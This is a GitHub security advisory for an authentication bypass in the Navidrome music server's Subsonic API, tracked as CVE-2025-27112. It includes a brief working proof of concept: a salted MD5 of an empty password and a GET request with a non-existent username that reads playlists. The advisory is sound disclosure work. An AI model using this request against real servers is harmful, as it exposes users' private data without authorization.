# [M] Navidrome allows an authentication bypass in Subsonic API with non-existent username

## Summary
Severity: Medium
Advisory: GHSA-c3p4-vm8f-386p
CVE: CVE-2025-27112
CWE: CWE-287
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-02-25
Source: https://github.com/advisories/GHSA-c3p4-vm8f-386p
Type: github-advisory

## Affected
- Go: `github.com/navidrome/navidrome` — affected >=0.52.0 <0.54.5

## Details
### Summary

In certain Subsonic API endpoints, authentication can be bypassed by using a non-existent username combined with an empty (salted) password hash. This allows read-only access to the server’s resources, though attempts at write operations fail with a “permission denied” error.

### Details

A flaw in the authentication check process allows an attacker to specify any arbitrary username that does not exist on the system, along with a salted hash of an empty password. Under these conditions, Navidrome treats the request as authenticated, granting access to various Subsonic endpoints without requiring valid credentials.

### Proof of Concept (PoC)

1. Generate a random salt:

   ```javascript
   // e.g., salt = "x1vbudn1m6d"
   Math.random().toString(36).substring(2, 15)
   ```

2. Calculate the MD5 hash of an empty password plus the salt:

   ```shell
   # Using the example salt above
   echo -n "x1vbudn1m6d" | md5sum
   81f0c0fb5d202ab0d012e6eaeb722d79  -
   ```

3. Send a request specifying a fake user, with the hash and salt values:

   ```
   GET https://[host]/rest/getPlaylists?u=FakeUser&t=81f0c0fb5d202ab0d012e6eaeb722d79&s=x1vbudn1m6d&v=1.16.1&c=castafiore&f=json
   ```

### Impact

An attacker can use any non-existent username to bypass the authentication system and gain access to various read-only data in Navidrome, such as user playlists. However, any attempt to modify data fails due to insufficient permissions, limiting the impact to unauthorized viewing of information.

## References
- https://github.com/navidrome/navidrome/security/advisories/GHSA-c3p4-vm8f-386p
- https://nvd.nist.gov/vuln/detail/CVE-2025-27112
- https://github.com/navidrome/navidrome/commit/09ae41a2da66264c60ef307882362d2e2d8d8b89
- https://github.com/navidrome/navidrome/commit/287079a9e409fb6b9708ca384d7daa7b5185c1a0
- https://github.com/navidrome/navidrome
